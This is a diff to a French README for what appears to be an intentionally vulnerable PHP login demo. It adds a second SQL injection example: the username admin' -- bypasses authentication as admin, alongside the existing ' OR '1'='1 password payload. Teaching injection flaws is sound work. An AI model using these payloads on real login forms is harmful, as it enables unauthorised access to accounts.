@@ -32,15 +32,27 @@ Un script `setup.php` initialise une base sql, avec une table `users` et deux ut
 
 ## 📌 Exemple d’exploitation
 
+### Exemple 1
 - **Utilisateur** : *(peu importe)*
 
 - **Mot de passe** :  
   ```text
   ' OR '1'='1
   ```
-
-
 ✅ Résultat : connexion réussie.
+
+### Exemple 2
+
+- **Utilisateur** :
+```text
+  admin' -- 
+  ```
+Ne pas oublier l'espace après les --
+
+- **Mot de passe** : *(peu importe)*
+
+
+✅ Résultat : connexion réussie en admin.
 
 ---
 
